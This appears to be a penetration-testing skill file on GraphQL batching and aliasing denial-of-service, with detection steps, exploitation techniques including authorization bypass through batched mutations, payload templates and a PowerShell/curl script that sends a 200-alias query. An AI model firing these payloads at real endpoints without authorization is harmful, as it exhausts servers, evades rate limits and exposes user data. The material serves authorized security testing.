---
name: batching-dos
description: GraphQL batching DoS — batch queries/aliases to bypass rate limits and exhaust compute (CWE-400). Use when a GraphQL endpoint is in scope and rate limits are per-request rather than per-operation.
category: api
---

# GraphQL Batching DoS / Aliasing

## Detection
- GraphQL endpoint present (`/graphql`, `POST` introspection).
- Check if response allows `["batch"]` array operations or query aliasing (`a: user(id:1)`, `b: user(id:2)`).
- No limit on operations per request.

## Exploitation
1. **Alias amplification**: single query with hundreds of aliases:
```graphql
{ a0: user(id:1) {email} a1: user(id:2) {email} ... }
```
2. **Batch array**: `POST` body `[{"query":...},{"query":...}]`.
3. **Fragments/recursion**: deeply nested fragments to increase cost.
4. **Batching + auth bypass**: batch includes the victim's mutation alongside your query (test for operation-level authz gaps, e.g. only the FIRST operation authorized).
5. **DoS**: unbounded aliases → high CPU; measure response time scaling to prove amplification.

## Payloads
```graphql
# alias amplification (min 100 aliases)
{ u0: user(id:1){email name} u1: user(id:2){email name} ... uN: user(id:N){email name} }
# batch array
[{"query":"query{me{id}}"},{"query":"mutation{sendInvite(input:{...})}"}]
```

## Tool Commands
```powershell
# generate + send 200-alias query
$n = 200
$a = (1..$n) | ForEach-Object { "u$_: user(id:$_){email}" } -join " "
$body = @{ query = "{$a}" } | ConvertTo-Json -Compress
curl.exe -s -X POST "$U/graphql" -H 'Content-Type: application/json' -d $body -w " %{http_code} size:%{size_download} time:%{time_total}"
```

## Verification & Evidence
- Show amplification: response size/time scales with alias count and rate limit is bypassed.
- Do NOT hammer beyond a safe ceiling; log scaling evidence only.